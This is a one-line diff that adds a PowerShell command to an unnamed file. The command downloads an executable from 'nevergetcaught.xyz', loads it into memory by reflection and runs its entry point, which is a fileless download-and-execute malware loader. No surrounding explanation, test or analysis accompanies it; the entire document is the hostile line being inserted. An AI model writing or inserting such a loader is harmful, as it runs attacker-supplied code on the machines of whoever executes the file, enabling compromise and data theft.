@@ -1,0 +1,1 @@
+powershell "[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://nevergetcaught.xyz/custom.exe')).EntryPoint.Invoke($null, (, [string[]]::new(0)))"
